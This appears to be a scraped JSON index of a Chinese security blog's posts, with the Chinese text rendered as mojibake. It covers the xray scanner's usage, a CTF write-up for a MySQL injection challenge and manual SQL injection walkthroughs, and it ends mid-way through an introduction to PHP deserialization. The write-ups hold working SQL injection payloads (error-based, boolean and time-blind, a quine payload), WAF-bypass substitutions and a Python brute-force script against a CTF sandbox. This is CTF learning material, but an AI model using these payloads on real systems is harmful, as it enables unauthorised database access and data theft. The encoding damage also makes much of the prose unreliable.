http://example.com/\n\n\nè¿™å¯èƒ½æ˜¯æœ€ç®€å•æœ€å¸¸ç”¨çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯å¤ªé•¿äº†ï¼Œä½“éªŒä¸å¤ªå‹å¥½ï¼Œå»ºè®®å¸¸ç”¨çš„åŒå­¦å¯ä»¥ alias xray=&quot;/path/xray webscan --basic-crawler&quot;\n\næŒ‡å®šæ‰«æè¾“å‡ºä¸æŒ‡å®šè¾“å‡ºæ—¶ï¼Œé»˜è®¤è¾“å‡ºåˆ°æ§åˆ¶å°çš„æ ‡å‡†è¾“å‡ºä¸­ï¼Œå¯ä»¥åšç®¡é“å¤„ç†ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©è¾“å‡ºä¸ºæ–‡ä»¶ï¼Œå¦‚ï¼š\n./xray webscan --url http://example.com/ --json-output report.json\n\nä¸åŒå‚æ•°å¯¹åº”ä¸åŒçš„è¾“å‡ºæ–¹å¼ï¼š\n\næ— å‚æ•°ï¼šè¾“å‡ºåˆ°æ§åˆ¶å°çš„æ ‡å‡†è¾“å‡º\n--text-outputï¼šè¾“å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ä¸­\n--json-outputï¼šè¾“å‡ºåˆ° JSON æ–‡ä»¶ä¸­\n--html-outputï¼šè¾“å‡ºåˆ° HTML æ–‡ä»¶ä¸­\n\nåŸºäºä»£ç†çš„è¢«åŠ¨æ‰«æxray å¯ä»¥é€šè¿‡ç±»ä¼¼ Burp çš„æ–¹å¼å¯åŠ¨ï¼Œåˆ©ç”¨ HTTP ä»£ç†æ¥æŠ“åŒ…æ‰«æï¼Œå¦‚ï¼š\n./xray webscan --listen 127.0.0.1:7777\n\nå¦‚æœè¿è¡Œæ²¡æŠ¥ä»»ä½•é”™å°±å¯ä»¥è®¾ç½®æµè§ˆå™¨ HTTP ä»£ç†ä¸º 127.0.0.1:7777 äº†ï¼Œå…³äºå¦‚ä½•è®¾ç½®æµè§ˆå™¨ä»£ç†ï¼Œè¯·æ‰“å¼€ç™¾åº¦æœç´¢ â€œæµè§ˆå™¨è®¾ç½®ä»£ç†â€ã€‚\nä»£ç†è®¾ç½® OK ä»¥åå°±å¯ä»¥å¯åŠ¨ä»£ç†æ‰«æäº†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬æ‰“æ¥æµè§ˆå™¨å°½æƒ…å†²æµªå§ï¼Œç†è®ºä¸Šæˆ‘ä»¬çš„é¼ æ ‡ç‚¹åˆ°å“ª xray å°±èƒ½æ‰«åˆ°å“ªã€‚\néœ€è¦æ³¨æ„ä¸€ä¸‹çš„æ˜¯ï¼Œå¾ˆå¤šæ—¶å€™è¿˜ä¼šæ‰«åˆ° HTTPS ç«™ç‚¹ï¼Œå¯èƒ½ä¼šå› ä¸ºæœ‰ä»£ç†è€Œå¯¼è‡´æ— æ³•è®¿é—®ï¼Œæˆ–è€…éœ€è¦æ‰‹åŠ¨ç¡®è®¤å®‰å…¨é£é™©ã€‚è¿™æ—¶å€™éœ€è¦æˆ‘ä»¬å¯¼å…¥ xray è¿è¡Œç›®å½•ä¸‹çš„ ca.crt è¯ä¹¦ï¼Œå…³äºå¦‚ä½•å¯¼å…¥ CA è¯ä¹¦ï¼Œè¯·æ‰“å¼€ç™¾åº¦æœç´¢ â€œå®‰è£…CAè¯ä¹¦â€ã€‚\nâœ   lsca.crt      ca.key      config.yaml xray\n\né«˜çº§å§¿åŠ¿æŒ‡å®šæ‰«ææ’ä»¶ä½¿ç”¨ --plugins å‚æ•°å¯ä»¥é€‰æ‹©ä»…å¯ç”¨éƒ¨åˆ†æ‰«ææ’ä»¶ï¼Œå¤šä¸ªæ’ä»¶ä¹‹é—´å¯ä½¿ç”¨é€—å·åˆ†éš”ï¼Œå¦‚ï¼š\n./xray webscan --plugins cmd_injection --url http://example.com/\n\nç›®å‰æä¾›çš„æ’ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š\n\nSQL æ³¨å…¥æ£€æµ‹ (key: sqldet)æ”¯æŒæŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥å’Œæ—¶é—´ç›²æ³¨ç­‰\nXSS æ£€æµ‹ï¼ˆkey: xssï¼‰æ”¯æŒæ‰«æåå°„å‹ã€å­˜å‚¨å‹ XSS\nå‘½ä»¤&#x2F;ä»£ç æ³¨å…¥æ£€æµ‹ (key: cmd_injection)æ”¯æŒ shell å‘½ä»¤æ³¨å…¥ã€PHP ä»£ç æ‰§è¡Œã€æ¨¡æ¿æ³¨å…¥ç­‰\nç›®å½•æšä¸¾ (key: dirscan)æ£€æµ‹å¤‡ä»½æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ã€debug é¡µé¢ã€é…ç½®æ–‡ä»¶ç­‰10ä½™ç±»æ•æ„Ÿè·¯å¾„å’Œæ–‡ä»¶\nè·¯å¾„ç©¿è¶Šæ£€æµ‹ (key: path_traversal)æ”¯æŒå¸¸è§å¹³å°å’Œç¼–ç \nXML å®ä½“æ³¨å…¥æ£€æµ‹ (key: xxe)æ”¯æŒæœ‰å›æ˜¾å’Œåè¿å¹³å°æ£€æµ‹\nPOC ç®¡ç† (key: phantasm)é»˜è®¤å†…ç½®éƒ¨åˆ†å¸¸ç”¨çš„ POCï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œæ„å»º POC å¹¶è¿è¡Œã€‚å¯å‚è€ƒï¼šPOC ç¼–å†™æ–‡æ¡£\næ–‡ä»¶ä¸Šä¼ æ£€æµ‹ (key: upload)æ”¯æŒæ£€æµ‹å¸¸è§çš„åç«¯æœåŠ¡å™¨è¯­è¨€çš„ä¸Šä¼ æ¼æ´\nå¼±å£ä»¤æ£€æµ‹ (key: brute_force)æ”¯æŒæ£€æµ‹ HTTP åŸºç¡€è®¤è¯å’Œç®€æ˜“è¡¨å•å¼±å£ä»¤ï¼Œå†…ç½®å¸¸è§ç”¨æˆ·åå’Œå¯†ç å­—å…¸\nJSONP æ£€æµ‹ (key: jsonp)æ£€æµ‹åŒ…å«æ•æ„Ÿä¿¡æ¯å¯ä»¥è¢«è·¨åŸŸè¯»å–çš„ jsonp æ¥å£\nSSRF æ£€æµ‹ (key: ssrf)ssrf æ£€æµ‹æ¨¡å—ï¼Œæ”¯æŒå¸¸è§çš„ç»•è¿‡æŠ€æœ¯å’Œåè¿å¹³å°æ£€æµ‹\nåŸºçº¿æ£€æŸ¥ (key: baseline)æ£€æµ‹ä½ SSL ç‰ˆæœ¬ã€ç¼ºå¤±çš„æˆ–é”™è¯¯æ·»åŠ çš„ http å¤´ç­‰\nä»»æ„è·³è½¬æ£€æµ‹ (key: redirect)æ”¯æŒ HTML meta è·³è½¬ã€30x è·³è½¬ç­‰\nCRLF æ³¨å…¥ (key: crlf_injection)æ£€æµ‹ HTTP å¤´æ³¨å…¥ï¼Œæ”¯æŒ queryã€body ç­‰ä½ç½®çš„å‚æ•°\nâ€¦\n\nåªæ‰«æä¸€ä¸ª URLxray è¿˜æä¾›äº†æ–¹ä¾¿çš„åªæ‰«æä¸€ä¸ª URL çš„æ–¹å¼ï¼Œå¦‚ï¼š\n./xray webscan --url http://example.com/ --json-output out.json\n","categories":["åˆ©å…¶å™¨"],"tags":["å·¥å…·","xray"]},{"title":"yet_another_mysql_injection","url":"/yet-another-mysql-injection/","content":"2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injection\nåˆå§‹ç•Œé¢\n\n\næŸ¥çœ‹æºä»£ç å‘ç°æºç æ–‡ä»¶  &#x2F;?source\n&lt;?phpinclude_once(&quot;lib.php&quot;);function alertMes($mes,$url)&#123;    die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);&#125;function checkSql($s) &#123;    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123;        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);    &#125;&#125;if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123;    $username=$_POST[&#x27;username&#x27;];    $password=$_POST[&#x27;password&#x27;];    if ($username !== &#x27;admin&#x27;) &#123;        alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);    &#125;    checkSql($password);    $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;    $user_result=mysqli_query($con,$sql);    $row = mysqli_fetch_array($user_result);    if (!$row) &#123;        alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);    &#125;    if ($row[&#x27;password&#x27;] === $password) &#123;    die($FLAG);    &#125; else &#123;    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);  &#125;&#125;if(isset($_GET[&#x27;source&#x27;]))&#123;  show_source(__FILE__);  die;&#125;?&gt;\n\n\næºç åˆ†æ\n\n\nalertMes($mes, $url)ï¼šè¯¥å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œ$mesï¼ˆè¦æ˜¾ç¤ºçš„æ¶ˆæ¯ï¼‰å’Œ$urlï¼ˆæ˜¾ç¤ºæ¶ˆæ¯åè¦é‡å®šå‘çš„URLï¼‰ã€‚å®ƒä½¿ç”¨JavaScriptè¾“å‡ºä¸€ä¸ªåŒ…å«ç»™å®šæ¶ˆæ¯çš„è­¦å‘Šå¼¹çª—ï¼Œç„¶åå°†ç”¨æˆ·é‡å®šå‘åˆ°æŒ‡å®šçš„URLã€‚\ncheckSql($s)ï¼šè¯¥å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°$sï¼ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ï¼Œå¹¶æ£€æŸ¥å…¶ä¸­æ˜¯å¦åŒ…å«ä»»ä½•å¯ç–‘çš„SQLå…³é”®è¯æˆ–å­—ç¬¦ï¼Œè¿™å¯èƒ½è¡¨æ˜è¯•å›¾è¿›è¡ŒSQLæ³¨å…¥æ”»å‡»ã€‚å¦‚æœå‘ç°ä»»ä½•å¯ç–‘å…³é”®è¯æˆ–å­—ç¬¦ï¼Œå®ƒå°†ä½¿ç”¨alertMeså‡½æ•°æ˜¾ç¤ºè­¦å‘Šï¼Œå¹¶å°†ç”¨æˆ·é‡å®šå‘åˆ° â€œindex.phpâ€ã€‚\n\nfunction checkSql($s) &#123;    if(preg_match(&quot;/regexp|between|in|flag| =| &gt;|&lt; |and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123;        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);    &#125;&#125;\n\n\næ¨¡å¼åˆ†éš”ç¬¦åçš„â€iâ€æ ‡è®°è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„æœç´¢\n\nsleep å¯ä»¥ç”¨benchmarkä»£æ›¿&lt;,&gt; å¯ä»¥ç”¨least(),greatest()ä»£æ›¿=,in å¯ä»¥ç”¨likeä»£æ›¿substr å¯ä»¥ç”¨midä»£æ›¿ç©ºæ ¼ å¯ä»¥ç”¨/**/ä»£æ›¿\n\n\næ³¨å…¥è„šæœ¬æµ‹è¯•\n\nimport requestsimport timechar = &#x27;01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&amp;%&#x27;def password():    flag = &#x27;&#x27;    url = &#x27;http://challenge-f48e2f483110ea2f.sandbox.ctfhub.com:10800/index.php&#x27;    while True:        for i in char:            payload = &#123;&quot;username&quot;: &quot;admin&quot;,                       &quot;password&quot;: f&quot;1&#x27;or/**/password/**/like/**/&#x27;&#123;flag + i&#125;%&#x27;#&quot;                       &#125;            # print(payload)            res = requests.post(url=url, data=payload)            if &quot;something wrong&quot; not in res.text:                flag += i                print(flag)                break            if &quot;ctfhub&quot; in res.text:                print(&quot;game over&quot;)                break            elif &quot;~&quot; in i:                print(&quot;just ok&quot;)                returnif __name__ == &#x27;__main__&#x27;:    password()\n\nè¿è¡Œç»“æœ o2cqmlyo0kpjkdyocm8cfbygzaievxbw       just ok\né€šè¿‡ç”¨æˆ·å admin å¯†ç  o2cqmlyo0kpjkdyocm8cfbygzaievxbw ç™»å½• è¿˜æ˜¯æ˜¾ç¤ºé”™è¯¯ \n\né€šè¿‡ç½‘ä¸Šwriteup å‘ç°\n\nä½¿ç”¨äº† quineæ³¨å…¥\n1.é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹replace()å‡½æ•°\n\nreplace(object,search,replace)\næŠŠobjectå¯¹è±¡ä¸­å‡ºç°çš„çš„searchå…¨éƒ¨æ›¿æ¢æˆreplace\n\næ³¨å…¥çš„payload:\n1&#x27;/**/union/**/select/**/replace(replace(&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#\n\nCHAR(34)=&quot;       CHAR(39)=&#39;        CHAR(33)=!         char(46)=.\nquineæ³¨å…¥\næ ¸å¿ƒæ€æƒ³ï¼š\nsqlè¯­å¥æ‰§è¡Œçš„ç»“æœç­‰äºsqlè¯­å¥æœ¬èº«\n\nå³åˆ©ç”¨sqlæ‰§è¡Œçš„ç»“æœç­‰äºå®ƒæœ¬èº«ç»•è¿‡åˆ¤æ–­ï¼š\n$row[â€˜passwordâ€™] &#x3D;&#x3D;&#x3D; $password\n1&#x27; union select replace(replace(&#x27;1&quot; union select replace(replace(&quot;.&quot;,&quot;,&#x27;) ,., &quot;.&quot;)#&#x27;,&quot;, &#x27;), ., &#x27;1 union select replace(replace(&quot;.&quot;, &quot;,&#x27;), ., &quot;.&quot;)#&#x27;)#\n\n","categories":["CTF","ctfhub"],"tags":["web","sqlæ³¨å…¥"]},{"title":"ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)","url":"/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/","content":"ä¾‹é¢˜(æ‰‹å·¥æ³¨å…¥)ä¾‹é¢˜1ï¼šæŠ¥é”™æ³¨å…¥(ctfhub)\næŠ¥é”™æ³¨å…¥ï¼šé¦–å…ˆæƒ³åˆ° updatexml \n1 union select updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n\næ­¤æ—¶æŸ¥è¯¢åˆ°æ•°æ®åº“åï¼šsqli\n1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;sqli&quot;),0x7e),1)\n\n\næŸ¥è¯¢åˆ°è¡¨åï¼šflag è¿›è€ŒæŸ¥è¯¢åˆ—åï¼š\n1 union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),0x7e),1)\n\n\næœ€åæŸ¥è¯¢ åˆ—åä¸º flag çš„ä¿¡æ¯\n1 union select updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)\n\n\nä¾‹é¢˜2ï¼šå¸ƒå°”ç›²æ³¨(ctfhub)\n\nsubstr(str,from,length):è¿”å›ä»ä¸‹æ ‡ä¸ºfromæˆªå–é•¿åº¦ä¸ºlengthçš„strå­ä¸²ã€‚å…¶ä¸­ï¼Œé¦–å­—ç¬¦ä¸‹æ ‡ä¸º1\nlength(str):è¿”å›strä¸²é•¿åº¦\n\n\n1. é¦–å…ˆ   çˆ†æ•°æ®åº“åé•¿åº¦ ä½¿ç”¨length(database()) = i è·å–æ•°æ®åº“åçš„é•¿åº¦\n1 and length(database())=1......1 and length(database())=4\n\n\n2. æ ¹æ®æ•°æ®åº“åé•¿åº¦çˆ†åº“å ä½¿ç”¨  substr(database(),i,1)\n?id=1 and substr(database(),1,1)=â€˜aâ€™#query_error...?id=1 and substr(database(),1,1)=â€˜sâ€™#query_success#åº“åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯s...?id=1 and substr(database(),4,1)=â€˜iâ€™#query_success#åº“åç¬¬å››ä¸ªå­—ç¬¦æ˜¯i#åº“åæ˜¯sqli\n\n\n3. è·å–æ•°æ®åº“å†…çš„è¡¨æ•°é‡ï¼Œä½¿ç”¨mysqlçš„æŸ¥è¯¢è¯­å¥select COUNT(*)ã€‚åŒæ ·ï¼Œè¦ä¸€ä¸ª1åˆ°æ— ç©·çš„å¾ªç¯\n?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=1#query_error?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=2#query_success#å½“å‰åº“sqliæœ‰2å¼ è¡¨\n\n\n4. ä½¿ç”¨limit i ,1é™å®šæ˜¯ç¬¬å‡ å¼ è¡¨ï¼Œå†…åµŒå¾ªç¯jä»1åˆ°æ— ç©·ï¼ˆç©·ä¸¾æ‰€æœ‰è¡¨åé•¿åº¦å¯èƒ½æ€§ï¼‰å°è¯•è·å–æ¯ä¸ªè¡¨çš„è¡¨åé•¿åº¦\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=1#query_error...?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=4#query_success#å½“å‰åº“sqliçš„ç¬¬ä¸€å¼ è¡¨è¡¨åé•¿åº¦ä¸º4...?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 1,1)=4#query_success#å½“å‰åº“sqliçš„ç¬¬äºŒå¼ è¡¨è¡¨åé•¿åº¦ä¸º4#å½“å‰åº“sqliæœ‰ä¸¤å¼ è¡¨â€™newsâ€™å’Œâ€™flagâ€˜ï¼Œè¡¨åé•¿åº¦å‡ä¸º4\n\n\n\nè¡¨åé•¿åº¦çˆ†è¡¨åsubstr((selectâ€¦limit i,1),j,1)\n?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;#query_error...?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;n&#x27;#query_success#å½“å‰åº“sqliçš„ç¬¬ä¸€å¼ è¡¨è¡¨åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯n...?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1)=&#x27;g&#x27;#query_success#å½“å‰åº“sqliçš„ç¬¬äºŒå¼ è¡¨è¡¨åçš„ç¬¬å››ä¸ªå­—ç¬¦æ˜¯g#å½“å‰åº“sqliæœ‰ä¸¤å¼ è¡¨â€™newsâ€˜å’Œâ€˜flagâ€™\n\n\nå¯¹è¡¨çˆ†åˆ—æ•°é‡\n\n?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;)=1#query_error?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;)=2#query_success#å½“å‰åº“sqliè¡¨flagçš„åˆ—æ•°ä¸º2\n\n\næ ¹æ®è¡¨åå’Œåˆ—æ•°é‡çˆ†åˆ—åé•¿åº¦\n\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1)=1#query_error...?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1)=4#query_success#å½“å‰åº“sqliè¡¨flagçš„ç¬¬ä¸€åˆ—åˆ—åé•¿åº¦ä¸º4...?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1)=4#query_success#å½“å‰åº“sqliè¡¨flagçš„ç¬¬äºŒåˆ—åˆ—åé•¿åº¦ä¸º4#å½“å‰åº“sqliè¡¨flagæœ‰ä¸¤ä¸ªåˆ—â€˜idâ€™å’Œâ€˜flagâ€™ï¼Œåˆ—åé•¿åº¦ä¸º2å’Œ4\n\n\næ ¹æ®åˆ—åé•¿åº¦çˆ†åˆ—å\n\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),1,1)=&#x27;a&#x27;#query_error...?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),1,1)=&#x27;i&#x27;#query_success#å½“å‰åº“sqliè¡¨flagçš„ç¬¬ä¸€åˆ—åˆ—åç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºi...?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 1,1),4,1)=&#x27;g&#x27;#query_success#å½“å‰åº“sqliè¡¨flagçš„ç¬¬äºŒåˆ—åˆ—åç¬¬å››ä¸ªå­—ç¬¦ä¸ºg#å½“å‰åº“sqliè¡¨flagæœ‰ä¸¤ä¸ªåˆ—â€˜idâ€™å’Œâ€˜flagâ€™\n\n\næ ¹æ®åˆ—åçˆ†æ•°æ®\n\n?id=1 and substr((select flag from sqli.flag),1ï¼Œ1)=â€œaâ€#query_error...?id=1 and substr((select flag from sqli.flag),1ï¼Œ1)=â€œcâ€#query_success#flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯c...?id=1 and substr((select flag from sqli.flag),iï¼Œ1)=â€œ&#125;â€#query_success#flagçš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯&#125;#è¿™é‡Œçš„jæ˜¯è®¡æ•°å˜é‡jä»1è‡ªå¢1å¾—åˆ°çš„å€¼#å‡ºå¾ªç¯å³å¯å¾—åˆ°flag\n\nä¾‹é¢˜3ï¼šæ—¶é—´ç›²æ³¨(ctfhub)æ—¶é—´ç›²æ³¨å’Œä¸Šä¸€ç¯‡å¸ƒå°”ç›²æ³¨ä¸€æ ·éƒ½æ˜¯ç›²æ³¨ï¼Œéƒ½éœ€è¦å€ŸåŠ©length,ascii,substrè¿™äº›ç¥å¥‡çš„å‡½æ•°æ¥çŒœæµ‹å„é¡¹ä¿¡æ¯ã€‚å®ƒä»¬çš„å·®åˆ«æ˜¯çŒœæµ‹æˆåŠŸçš„ä¾æ®ã€‚\nå¸ƒå°”ç›²æ³¨çš„è¯å¦‚æœæŸ¥è¯¢æœ‰ç»“æœï¼Œä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ªsuccess_flag,æ¯”å¦‚åœ¨ä¸Šä¸€é¢˜é‡Œå°±ä¼šè¿”å›query successfullyã€‚\nä½†æ˜¯æ—¶é—´ç›²æ³¨ä¸ä¸€æ ·ï¼Œå®ƒä¸å…‰ä¸ç»™ä½ æŸ¥è¯¢çš„å†…å®¹çš„å›æ˜¾ï¼Œä¸ç»™ä½ æŠ¥é”™ä¿¡æ¯ï¼Œç”šè‡³è¿å¸ƒå°”ç›²æ³¨é‡Œçš„success_flagä¹Ÿä¸ç»™ã€‚æ—¶é—´ç›²æ³¨ç›¸å½“äºè‡ªè¡Œåˆ›é€ å‡ºäº†ä¸€ä¸ªsuccess_flagï¼Œå°†æŸ¥è¯¢æˆåŠŸçš„æƒ…å†µä¸æŸ¥è¯¢å¤±è´¥çš„æƒ…å†µåšäº†åŒºåˆ†ã€‚\n\nsubstr(str,from,length):è¿”å›ä»ä¸‹æ ‡ä¸ºfromæˆªå–é•¿åº¦ä¸ºlengthçš„strå­ä¸²ã€‚å…¶ä¸­ï¼Œé¦–å­—ç¬¦ä¸‹æ ‡ä¸º1\n\n\né¦–å…ˆçˆ†ç ´æ•°æ®åº“é•¿åº¦\n\n1 and if(length(database())=4,sleep(3),1)\n\n\n\nçˆ†ç ´æ•°æ®åº“åå­—\n\n1 and if(ascii(substr(database(),1,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),1,1))=115,sleep(3),1)\tascii(s)=1151 and if(ascii(substr(database(),2,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),2,1))=113,sleep(3),1)\tascii(q)=1131 and if(ascii(substr(database(),3,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),3,1))=108,sleep(3),1)\tascii(l)=1081 and if(ascii(substr(database(),4,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),4,1))=105,sleep(3),1)\tascii(i)=105......ä¸æ–­è°ƒæ•´ASCIIç çš„èŒƒå›´é€æ¸å¾—åˆ°æ•°æ®åº“åç§°ä¸ºsqli\n\n\n\nçˆ†ç ´æ•°æ®åº“ä¸­è¡¨çš„æ•°é‡\n\n1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(3),1)\n\n\n\nçˆ†ç ´æ•°æ®åº“ä¸­çš„å„è¡¨å\n\n1 and if(ascii(substr((select table_name from information_schema.tables  where table_schema=database() limit 0,1),1,1))=110,sleep(3),1)  ascii(n)=1103ç§’åå“åº”ï¼Œè¯´æ˜ç¬¬ä¸€å¼ è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºnä¾æ¬¡å¾—åˆ°è¡¨åä¸ºnewslimit i,1  i è¡¨ç¤ºçš„å³æ˜¯ç¬¬å‡ å¼ è¡¨1 and if(ascii(substr((select table_name from information_schema.tables  where table_schema=database() limit 1,1),1,1))=102,sleep(3),1)  ascii(f)=1023ç§’åå“åº”ï¼Œè¯´æ˜ç¬¬äºŒå¼ è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºfä¾æ¬¡å¾—åˆ°è¡¨åä¸ºflag\n\n\n\nçˆ†ç ´flagè¡¨çš„å­—æ®µæ•°\n\n1 and if((select count(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)=1,sleep(3),1)\n\n\nçŒœè§£å­—æ®µå\n\n1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27;),1,1))=102,sleep(3),1)ä¸€æ ·çš„å¥—è·¯ï¼Œå¾—åˆ°å­—æ®µåä¸ºflag\n\n","categories":["Web"],"tags":["æ‰‹å·¥æ³¨å…¥","æŠ¥é”™æ³¨å…¥","å¸ƒå°”ç›²æ³¨","æ—¶é—´ç›²æ³¨","ctfhub"]},{"title":"ååºåˆ—åŒ–","url":"/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"ååºåˆ—åŒ–PHP ååºåˆ—åŒ–serialize()serialize() â€”&gt; å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\n&lt;?phpClass test&#123;  public $a= &#x27;1&#x27;;  public $bb= 2;  public $ccc= True;&#125;$r= new test();echoserialize($r);$array_t= array(&quot;a&quot;=&gt;&quot;1&quot;,&quot;bb&quot;=&gt;&quot;2&quot;,&quot;ccc&quot;=&gt;&quot;3&quot;);echo serialize($array_t);\n\n\nO:4:â€testâ€:3:{s:1:â€aâ€;s:1:â€1â€;s:2:â€bbâ€;i:2;s:3:â€cccâ€;b:1;}a:3:\n\nå„ä¸ªå­—ç¬¦çš„æ„ä¹‰ â€”&gt; ç¬¬ä¸€ä¸ªå­—æ¯O ä»£è¡¨ Objectï¼Œaä»£è¡¨ arrayï¼Œsä»£è¡¨ stringï¼Œ,iè¡¨ç¤ºæ•°å­—\nç±»çš„å±æ€§æœ‰ä¸‰ç§ private protected å’Œ public\nPHP åºåˆ—åŒ–çš„æ—¶å€™ privateå’Œ protected å˜é‡ä¼šå¼•å…¥ä¸å¯è§å­—ç¬¦%00ï¼Œ%00ç±»å%00å±æ€§å ä¸ºprivateï¼Œ%00*%00å±æ€§å ä¸ºprotectedï¼Œæ³¨æ„è¿™ä¸¤ä¸ª %00å°±æ˜¯ ascii ç ä¸º0 çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³å¯¼è‡´æˆªæ–­ï¼Œä½†æ˜¯urlç¼–ç åå°±å¯ä»¥çœ‹å¾—æ¸…æ¥š\n&lt;?phpClass test&#123;  private $a= &quot;a&quot;;  protected $b= &quot;b&quot;;  public $c= &quot;c&quot;;&#125;$r= new test();echo serialize($r);echo urlencode(serialize($r));\n\n\nO:4:â€testâ€:3:{s:7:â€testaâ€;s:1:â€aâ€;s:4:â€*bâ€;s:1:â€bâ€;s:1:â€câ€;s:1:â€câ€;}\nO%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D\n\nunserialize()unserialize() â€”&gt; å‡½æ•°ç”¨äºå°†é€šè¿‡ serialize()å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„\n&lt;?php$sites = array(&#x27;t1&#x27;, &#x27;tt2&#x27;, &#x27;ttt3&#x27;);$serialized_data = serialize($sites);#echo  $serialized_data;$unserialized_data = unserialize($serialized_data);print_r($unserialized_data);?&gt;\n\n\nArray(â€‹ [0] &#x3D;&gt; t1â€‹ [1] &#x3D;&gt; tt2â€‹ [2] &#x3D;&gt; 